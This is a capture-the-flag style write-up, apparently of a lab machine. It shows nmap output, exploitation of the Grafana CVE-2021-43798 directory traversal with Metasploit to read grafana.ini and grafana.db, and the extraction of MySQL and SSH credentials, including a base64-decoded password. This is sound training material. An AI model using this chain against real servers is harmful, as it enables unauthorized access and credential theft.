## Enumeration

```
$ nmap 10.10.11.183 -T4 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 08:47 PST
Nmap scan report for 10.10.11.183
Host is up (0.079s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 45.04 seconds
```

- In `http://10.10.11.183`, we found a username `developer` but no password provided.
- In `http://10.10.11.183:3000`, there is a `grafana` portal with version `8.2.0`.

## Grafana

- After googling, we knew that Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 
  8.2.7, or 8.3.1 are vulnerable to directory traversal, `CVE-2021-43798`.

- Using metasploit `scanner/http/grafana_plugin_traversal`, we can download the file on the machine. The file would be saved in `~/.msf4/loot/`.

```
msf6 auxiliary(scanner/http/grafana_plugin_traversal) > run

[+] Detected vulnerable Grafina: 8.2.0
[*] 10.10.11.183 - Progress   0/40 (0.0%)
[+] alertlist was found and exploited successfully
[+] 10.10.11.183:3000 - File saved in: /home/parallels/.msf4/loot/20221223090532_default_10.10.11.183_grafana.loot_867160.ini
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- We downloaded `/etc/grafana/grafana.ini` and got `admin_password = messageInABottle685427`.
- Then, we logged in to grafana with credential `admin:messageInABottle685427`

- In the `http://10.10.11.183:3000/admin/settings`, we found the database setting with some interesting info.
  - `host	127.0.0.1:3306`, this is the mysql that we have enumerated
  - `name	grafana`
  - `path	grafana.db`
  - `type	sqlite3`
  - `user	root`

- Then, we use metasploit to fetch `/var/lib/grafana.db`. We can open it on `SQLite database browser`.
- In `data_source` table, we get mysql credential `grafana:dontStandSoCloseToMe63221!`

## MySQL

```
$ mysql -u grafana -h 10.10.11.183 -p

MySQL [none]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (18.664 sec)

MySQL [none]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.093 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.082 sec)

```

```
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

- Running base64 decode, and then we got `developer:anEnglishManInNewYork027468`
- We can use this credential to access ssh.